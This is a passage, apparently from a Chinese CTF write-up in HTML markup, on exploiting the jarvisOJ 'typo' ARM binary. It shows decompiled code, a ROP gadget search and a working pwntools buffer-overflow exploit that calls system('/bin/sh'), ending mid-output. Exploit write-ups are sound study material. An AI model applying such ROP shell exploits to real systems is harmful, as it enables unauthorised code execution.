+</span></span><span class=line><span class=cl>    <span class=n>v16</span> <span class=o>=</span> <span class=nf>__strex</span><span class=p>(</span><span class=mi>1u</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>lock</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>v15</span> <span class=o>=</span> <span class=n>v16</span> <span class=o>==</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>v16</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nf>__dmb</span><span class=p>(</span><span class=mh>0xBu</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>v15</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nf>_lll_lock_wait_private</span><span class=p>(</span><span class=o>&amp;</span><span class=n>lock</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=o>--</span><span class=n>sa_refcntr</span> <span class=o>||</span> <span class=p>(</span><span class=n>v17</span> <span class=o>=</span> <span class=nf>_sigaction</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>intr</span><span class=p>,</span> <span class=mi>0</span><span class=p>),</span> <span class=o>!</span><span class=p>(</span><span class=n>v17</span> <span class=o>|</span> <span class=nf>_sigaction</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>quit</span><span class=p>,</span> <span class=mi>0</span><span class=p>)))</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=nf>_sigprocmask</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>v28</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=n>v27</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>else</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>v27</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=nf>__dmb</span><span class=p>(</span><span class=mh>0xBu</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>do</span>
+</span></span><span class=line><span class=cl>    <span class=n>v18</span> <span class=o>=</span> <span class=nf>__ldrex</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>lock</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span> <span class=nf>__strex</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>lock</span><span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>v18</span> <span class=o>&gt;</span> <span class=mi>1</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nf>_libc_do_syscall</span><span class=p>(</span><span class=o>&amp;</span><span class=n>lock</span><span class=p>,</span> <span class=mi>129</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>v27</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
+</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>程序中的 do_system 实现</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-9-1><a class=lnlinks href=#hl-9-1> 1</a>
+</span><span class=lnt id=hl-9-2><a class=lnlinks href=#hl-9-2> 2</a>
+</span><span class=lnt id=hl-9-3><a class=lnlinks href=#hl-9-3> 3</a>
+</span><span class=lnt id=hl-9-4><a class=lnlinks href=#hl-9-4> 4</a>
+</span><span class=lnt id=hl-9-5><a class=lnlinks href=#hl-9-5> 5</a>
+</span><span class=lnt id=hl-9-6><a class=lnlinks href=#hl-9-6> 6</a>
+</span><span class=lnt id=hl-9-7><a class=lnlinks href=#hl-9-7> 7</a>
+</span><span class=lnt id=hl-9-8><a class=lnlinks href=#hl-9-8> 8</a>
+</span><span class=lnt id=hl-9-9><a class=lnlinks href=#hl-9-9> 9</a>
+</span><span class=lnt id=hl-9-10><a class=lnlinks href=#hl-9-10>10</a>
+</span><span class=lnt id=hl-9-11><a class=lnlinks href=#hl-9-11>11</a>
+</span><span class=lnt id=hl-9-12><a class=lnlinks href=#hl-9-12>12</a>
+</span><span class=lnt id=hl-9-13><a class=lnlinks href=#hl-9-13>13</a>
+</span><span class=lnt id=hl-9-14><a class=lnlinks href=#hl-9-14>14</a>
+</span><span class=lnt id=hl-9-15><a class=lnlinks href=#hl-9-15>15</a>
+</span><span class=lnt id=hl-9-16><a class=lnlinks href=#hl-9-16>16</a>
+</span><span class=lnt id=hl-9-17><a class=lnlinks href=#hl-9-17>17</a>
+</span><span class=lnt id=hl-9-18><a class=lnlinks href=#hl-9-18>18</a>
+</span><span class=lnt id=hl-9-19><a class=lnlinks href=#hl-9-19>19</a>
+</span><span class=lnt id=hl-9-20><a class=lnlinks href=#hl-9-20>20</a>
+</span><span class=lnt id=hl-9-21><a class=lnlinks href=#hl-9-21>21</a>
+</span><span class=lnt id=hl-9-22><a class=lnlinks href=#hl-9-22>22</a>
+</span><span class=lnt id=hl-9-23><a class=lnlinks href=#hl-9-23>23</a>
+</span><span class=lnt id=hl-9-24><a class=lnlinks href=#hl-9-24>24</a>
+</span><span class=lnt id=hl-9-25><a class=lnlinks href=#hl-9-25>25</a>
+</span><span class=lnt id=hl-9-26><a class=lnlinks href=#hl-9-26>26</a>
+</span><span class=lnt id=hl-9-27><a class=lnlinks href=#hl-9-27>27</a>
+</span><span class=lnt id=hl-9-28><a class=lnlinks href=#hl-9-28>28</a>
+</span><span class=lnt id=hl-9-29><a class=lnlinks href=#hl-9-29>29</a>
+</span><span class=lnt id=hl-9-30><a class=lnlinks href=#hl-9-30>30</a>
+</span><span class=lnt id=hl-9-31><a class=lnlinks href=#hl-9-31>31</a>
+</span><span class=lnt id=hl-9-32><a class=lnlinks href=#hl-9-32>32</a>
+</span><span class=lnt id=hl-9-33><a class=lnlinks href=#hl-9-33>33</a>
+</span><span class=lnt id=hl-9-34><a class=lnlinks href=#hl-9-34>34</a>
+</span><span class=lnt id=hl-9-35><a class=lnlinks href=#hl-9-35>35</a>
+</span><span class=lnt id=hl-9-36><a class=lnlinks href=#hl-9-36>36</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>sub_10BA8</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>v1</span><span class=p>;</span> <span class=c1>// r3
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// r0
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// r4
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// r2
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// r3
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v6</span><span class=p>;</span> <span class=c1>// r0
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v7</span><span class=p>;</span> <span class=c1>// [sp+A4h] [bp-ACh] BYREF
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v8</span><span class=p>[</span><span class=mi>42</span><span class=p>];</span> <span class=c1>// [sp+A8h] [bp-A8h] BYREF
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=n>v8</span><span class=p>[</span><span class=mi>32</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>v7</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>v8</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x80u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>dword_A2450</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>sub_23E44</span><span class=p>(</span><span class=o>&amp;</span><span class=n>dword_A2450</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>dword_A2454</span><span class=o>++</span> <span class=o>==</span> <span class=mi>0</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=nf>sub_315C8</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=mi>2</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v7</span><span class=p>,</span> <span class=n>dword_A24E4</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>0</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=o>--</span><span class=n>dword_A2454</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=nf>sub_315C8</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=mi>3</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v7</span><span class=p>,</span> <span class=n>dword_A2458</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>0</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>sub_A6D0</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=n>v3</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>v2</span> <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>v1</span> <span class=o>+</span> <span class=mi>69228</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=n>dword_A2454</span> <span class=o>=</span> <span class=n>v4</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nf>sub_315C8</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=mi>2</span><span class=p>,</span> <span class=n>dword_A24E4</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nf>sub_A6D0</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>v6</span> <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>v5</span> <span class=o>+</span> <span class=mi>69496</span><span class=p>))</span> <span class=o>=</span> <span class=n>v3</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=nf>JUMPOUT</span><span class=p>(</span><span class=mh>0xFFFF0FC0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>可以看到 ida pro 直接分析失败了</p><p>使用 rizzo 进行符号还原</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-10-1><a class=lnlinks href=#hl-10-1> 1</a>
+</span><span class=lnt id=hl-10-2><a class=lnlinks href=#hl-10-2> 2</a>
+</span><span class=lnt id=hl-10-3><a class=lnlinks href=#hl-10-3> 3</a>
+</span><span class=lnt id=hl-10-4><a class=lnlinks href=#hl-10-4> 4</a>
+</span><span class=lnt id=hl-10-5><a class=lnlinks href=#hl-10-5> 5</a>
+</span><span class=lnt id=hl-10-6><a class=lnlinks href=#hl-10-6> 6</a>
+</span><span class=lnt id=hl-10-7><a class=lnlinks href=#hl-10-7> 7</a>
+</span><span class=lnt id=hl-10-8><a class=lnlinks href=#hl-10-8> 8</a>
+</span><span class=lnt id=hl-10-9><a class=lnlinks href=#hl-10-9> 9</a>
+</span><span class=lnt id=hl-10-10><a class=lnlinks href=#hl-10-10>10</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>Rizzo<span class=o>]</span> Applying Rizzo signatures, this may take a few minutes...
+</span></span><span class=line><span class=cl><span class=o>[</span>Rizzo<span class=o>]</span> Generated <span class=m>791</span> formal signatures and <span class=m>513</span> fuzzy signatures <span class=k>for</span> <span class=m>870</span> functions in 4.22 seconds.
+</span></span><span class=line><span class=cl><span class=o>[</span>Rizzo<span class=o>]</span> Loading signatures from /home/lhon901/Desktop/Glibc/226_system.riz...
+</span></span><span class=line><span class=cl><span class=o>[</span>Rizzo<span class=o>]</span> loaded.
+</span></span><span class=line><span class=cl><span class=o>[</span>Rizzo<span class=o>]</span> Found <span class=m>0</span> formal matches in 0.00 seconds.
+</span></span><span class=line><span class=cl><span class=o>[</span>Rizzo<span class=o>]</span> Found <span class=m>0</span> fuzzy matches in 0.00 seconds.
+</span></span><span class=line><span class=cl><span class=o>[</span>Rizzo<span class=o>]</span> Found <span class=m>0</span> string matches in 0.00 seconds.
+</span></span><span class=line><span class=cl><span class=o>[</span>Rizzo<span class=o>]</span> Found <span class=m>0</span> immediate matches in 0.00 seconds.
+</span></span><span class=line><span class=cl><span class=o>[</span>Rizzo<span class=o>]</span> Renamed <span class=m>0</span> functions in 0.00 seconds.
+</span></span><span class=line><span class=cl><span class=o>[</span>Rizzo<span class=o>]</span> Signatures applied in 4.31 seconds</span></span></code></pre></td></tr></table></div></div><p>没有找到任何匹配</p><p>符号还原失败，我们可以尝试分析程序行为
+Glibc 的 <code>system</code> 函数实现会调用 <code>do_system</code> 函数
+<code>do_system</code> 函数会调用 <code>execve</code> 函数来执行 <code>/bin/sh</code>
+<code>system("echo 1");</code> 其实就是 <code>/bin/sh -c "echo 1"</code>
+所以我们只需要交叉引用找到 /bin/sh 的调用者即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-11-1><a class=lnlinks href=#hl-11-1>1</a>
+</span><span class=lnt id=hl-11-2><a class=lnlinks href=#hl-11-2>2</a>
+</span><span class=lnt id=hl-11-3><a class=lnlinks href=#hl-11-3>3</a>
+</span><span class=lnt id=hl-11-4><a class=lnlinks href=#hl-11-4>4</a>
+</span><span class=lnt id=hl-11-5><a class=lnlinks href=#hl-11-5>5</a>
+</span><span class=lnt id=hl-11-6><a class=lnlinks href=#hl-11-6>6</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>.text:00011010                 LDR     R0, =aBinSh     ; &#34;/bin/sh&#34;
+</span></span><span class=line><span class=cl>.text:00011014                 LDR     R2, [R3]
+</span></span><span class=line><span class=cl>.text:00011018                 ADD     R1, SP, #0x150+var_13C
+</span></span><span class=line><span class=cl>.text:0001101C                 STR     R4, [R5]
+</span></span><span class=line><span class=cl>.text:00011020                 STR     R4, [R5,#(dword_A2454 - 0xA2450)]
+</span></span><span class=line><span class=cl>.text:00011024                 BL      sub_21654</span></span></code></pre></td></tr></table></div></div><p>可以看到 /bin/sh 的调用者是 <code>sub_21654</code> 函数
+那么我们可以在 <code>sub_21654</code> 函数中就是 <code>execve</code> 函数
+<code>sub_21654</code> 函数的上层函数 <code>sub_10BA8</code> 函数就是 <code>do_system</code> 函数
+<code>sub_10BA8</code> 函数的上层函数 <code>sub_110B4</code> 就是 <code>system</code> 函数</p><p>找一下 gadget</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-12-1><a class=lnlinks href=#hl-12-1> 1</a>
+</span><span class=lnt id=hl-12-2><a class=lnlinks href=#hl-12-2> 2</a>
+</span><span class=lnt id=hl-12-3><a class=lnlinks href=#hl-12-3> 3</a>
+</span><span class=lnt id=hl-12-4><a class=lnlinks href=#hl-12-4> 4</a>
+</span><span class=lnt id=hl-12-5><a class=lnlinks href=#hl-12-5> 5</a>
+</span><span class=lnt id=hl-12-6><a class=lnlinks href=#hl-12-6> 6</a>
+</span><span class=lnt id=hl-12-7><a class=lnlinks href=#hl-12-7> 7</a>
+</span><span class=lnt id=hl-12-8><a class=lnlinks href=#hl-12-8> 8</a>
+</span><span class=lnt id=hl-12-9><a class=lnlinks href=#hl-12-9> 9</a>
+</span><span class=lnt id=hl-12-10><a class=lnlinks href=#hl-12-10>10</a>
+</span><span class=lnt id=hl-12-11><a class=lnlinks href=#hl-12-11>11</a>
+</span><span class=lnt id=hl-12-12><a class=lnlinks href=#hl-12-12>12</a>
+</span><span class=lnt id=hl-12-13><a class=lnlinks href=#hl-12-13>13</a>
+</span><span class=lnt id=hl-12-14><a class=lnlinks href=#hl-12-14>14</a>
+</span><span class=lnt id=hl-12-15><a class=lnlinks href=#hl-12-15>15</a>
+</span><span class=lnt id=hl-12-16><a class=lnlinks href=#hl-12-16>16</a>
+</span><span class=lnt id=hl-12-17><a class=lnlinks href=#hl-12-17>17</a>
+</span><span class=lnt id=hl-12-18><a class=lnlinks href=#hl-12-18>18</a>
+</span><span class=lnt id=hl-12-19><a class=lnlinks href=#hl-12-19>19</a>
+</span><span class=lnt id=hl-12-20><a class=lnlinks href=#hl-12-20>20</a>
+</span><span class=lnt id=hl-12-21><a class=lnlinks href=#hl-12-21>21</a>
+</span><span class=lnt id=hl-12-22><a class=lnlinks href=#hl-12-22>22</a>
+</span><span class=lnt id=hl-12-23><a class=lnlinks href=#hl-12-23>23</a>
+</span><span class=lnt id=hl-12-24><a class=lnlinks href=#hl-12-24>24</a>
+</span><span class=lnt id=hl-12-25><a class=lnlinks href=#hl-12-25>25</a>
+</span><span class=lnt id=hl-12-26><a class=lnlinks href=#hl-12-26>26</a>
+</span><span class=lnt id=hl-12-27><a class=lnlinks href=#hl-12-27>27</a>
+</span><span class=lnt id=hl-12-28><a class=lnlinks href=#hl-12-28>28</a>
+</span><span class=lnt id=hl-12-29><a class=lnlinks href=#hl-12-29>29</a>
+</span><span class=lnt id=hl-12-30><a class=lnlinks href=#hl-12-30>30</a>
+</span><span class=lnt id=hl-12-31><a class=lnlinks href=#hl-12-31>31</a>
+</span><span class=lnt id=hl-12-32><a class=lnlinks href=#hl-12-32>32</a>
+</span><span class=lnt id=hl-12-33><a class=lnlinks href=#hl-12-33>33</a>
+</span><span class=lnt id=hl-12-34><a class=lnlinks href=#hl-12-34>34</a>
+</span><span class=lnt id=hl-12-35><a class=lnlinks href=#hl-12-35>35</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>~/P/c/p/l/u/a/jarvisOJ_typo ❯❯❯ ROPgadget --binary ./typo --only <span class=s2>&#34;pop|ret&#34;</span>                                                                                <span class=o>(</span>.venv<span class=o>)</span> master ✱ ◼
+</span></span><span class=line><span class=cl>Gadgets <span class=nv>information</span>
+</span></span><span class=line><span class=cl><span class=o>============================================================</span>
+</span></span><span class=line><span class=cl>0x00008d1c : pop <span class=o>{</span>fp, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x00020904 : pop <span class=o>{</span>r0, r4, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x00068bec : pop <span class=o>{</span>r1, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x00008160 : pop <span class=o>{</span>r3, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x0000ab0c : pop <span class=o>{</span>r3, r4, r5, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x0000a958 : pop <span class=o>{</span>r3, r4, r5, r6, r7, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x00008a3c : pop <span class=o>{</span>r3, r4, r5, r6, r7, r8, fp, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x0000a678 : pop <span class=o>{</span>r3, r4, r5, r6, r7, r8, sb, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x00008520 : pop <span class=o>{</span>r3, r4, r5, r6, r7, r8, sb, sl, fp, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x00068c68 : pop <span class=o>{</span>r3, r4, r5, r6, r7, r8, sl, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x00014a70 : pop <span class=o>{</span>r3, r4, r7, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x00008de8 : pop <span class=o>{</span>r4, fp, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x000083b0 : pop <span class=o>{</span>r4, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x00008eec : pop <span class=o>{</span>r4, r5, fp, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x00009284 : pop <span class=o>{</span>r4, r5, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x000242e0 : pop <span class=o>{</span>r4, r5, r6, fp, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x000095b8 : pop <span class=o>{</span>r4, r5, r6, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x000212ec : pop <span class=o>{</span>r4, r5, r6, r7, fp, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x000082e8 : pop <span class=o>{</span>r4, r5, r6, r7, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x00043110 : pop <span class=o>{</span>r4, r5, r6, r7, r8, fp, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x00011648 : pop <span class=o>{</span>r4, r5, r6, r7, r8, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x00048e9c : pop <span class=o>{</span>r4, r5, r6, r7, r8, sb, fp, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x0000a5a0 : pop <span class=o>{</span>r4, r5, r6, r7, r8, sb, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x0000870c : pop <span class=o>{</span>r4, r5, r6, r7, r8, sb, sl, fp, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x00011c24 : pop <span class=o>{</span>r4, r5, r6, r7, r8, sb, sl, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x000553cc : pop <span class=o>{</span>r4, r5, r6, r7, r8, sl, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x00023ed4 : pop <span class=o>{</span>r4, r5, r7, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x00023dbc : pop <span class=o>{</span>r4, r7, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>0x00014068 : pop <span class=o>{</span>r7, pc<span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Unique gadgets found: <span class=m>29</span>
+</span></span><span class=line><span class=cl>~/P/c/p/l/u/a/jarvisOJ_typo</span></span></code></pre></td></tr></table></div></div><p>选用下面这条
+0x00020904 : pop {r0, r4, pc}</p><p>payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-13-1><a class=lnlinks href=#hl-13-1> 1</a>
+</span><span class=lnt id=hl-13-2><a class=lnlinks href=#hl-13-2> 2</a>
+</span><span class=lnt id=hl-13-3><a class=lnlinks href=#hl-13-3> 3</a>
+</span><span class=lnt id=hl-13-4><a class=lnlinks href=#hl-13-4> 4</a>
+</span><span class=lnt id=hl-13-5><a class=lnlinks href=#hl-13-5> 5</a>
+</span><span class=lnt id=hl-13-6><a class=lnlinks href=#hl-13-6> 6</a>
+</span><span class=lnt id=hl-13-7><a class=lnlinks href=#hl-13-7> 7</a>
+</span><span class=lnt id=hl-13-8><a class=lnlinks href=#hl-13-8> 8</a>
+</span><span class=lnt id=hl-13-9><a class=lnlinks href=#hl-13-9> 9</a>
+</span><span class=lnt id=hl-13-10><a class=lnlinks href=#hl-13-10>10</a>
+</span><span class=lnt id=hl-13-11><a class=lnlinks href=#hl-13-11>11</a>
+</span><span class=lnt id=hl-13-12><a class=lnlinks href=#hl-13-12>12</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&#34;./typo&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>system</span> <span class=o>=</span> <span class=mh>0x110B4</span>
+</span></span><span class=line><span class=cl><span class=n>pop_r0_r4_pc</span> <span class=o>=</span> <span class=mh>0x20904</span>
+</span></span><span class=line><span class=cl><span class=n>binsh</span> <span class=o>=</span> <span class=mh>0x6C384</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;a&#34;</span> <span class=o>*</span> <span class=mi>112</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>pop_r0_r4_pc</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>binsh</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>system</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-14-1><a class=lnlinks href=#hl-14-1> 1</a>
+</span><span class=lnt id=hl-14-2><a class=lnlinks href=#hl-14-2> 2</a>
+</span><span class=lnt id=hl-14-3><a class=lnlinks href=#hl-14-3> 3</a>
+</span><span class=lnt id=hl-14-4><a class=lnlinks href=#hl-14-4> 4</a>
+</span><span class=lnt id=hl-14-5><a class=lnlinks href=#hl-14-5> 5</a>
+</span><span class=lnt id=hl-14-6><a class=lnlinks href=#hl-14-6> 6</a>
+</span><span class=lnt id=hl-14-7><a class=lnlinks href=#hl-14-7> 7</a>
+</span><span class=lnt id=hl-14-8><a class=lnlinks href=#hl-14-8> 8</a>
+</span><span class=lnt id=hl-14-9><a class=lnlinks href=#hl-14-9> 9</a>
+</span><span class=lnt id=hl-14-10><a class=lnlinks href=#hl-14-10>10</a>
+</span><span class=lnt id=hl-14-11><a class=lnlinks href=#hl-14-11>11</a>
+</span><span class=lnt id=hl-14-12><a class=lnlinks href=#hl-14-12>12</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>~/P/c/p/l/u/a/jarvisOJ_typo ❯❯❯ python exp.py                                                                                                             <span class=o>(</span>.venv<span class=o>)</span> master ✱ ◼
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Starting <span class=nb>local</span> process <span class=s1>&#39;./typo&#39;</span>: pid <span class=m>145156</span>
+</span></span><span class=line><span class=cl>/home/lhon901/Pwn/ctf-challenges/pwn/linux/user-mode/arm/jarvisOJ_typo/exp.py:5: BytesWarning: Text is not bytes<span class=p>;</span> assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
